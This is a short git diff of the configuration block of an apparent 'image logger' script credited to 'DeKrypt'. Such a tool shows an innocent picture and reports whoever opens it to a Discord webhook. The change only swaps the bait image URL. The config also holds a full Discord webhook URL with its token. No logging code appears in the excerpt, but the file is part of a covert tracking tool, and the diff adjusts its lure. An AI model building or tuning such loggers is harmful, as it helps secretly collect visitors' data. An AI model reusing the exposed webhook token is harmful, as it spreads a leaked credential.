@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1337783451692175380/A3EaruOfkp36RW-k7B2He95FMky2otUNkvHKox99wTGajOMvvSKGw_5CVr2kl_4DTEtU",
-    "image": "https://media.tenor.com/6B0BpjfYcb0AAAAM/anime-lucky-star.gif", # You can also have a custom image by using a URL argument
+    "image": "https://en.anmosugoi.com/wp-content/uploads/2023/10/Portada-Lucky-Star.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
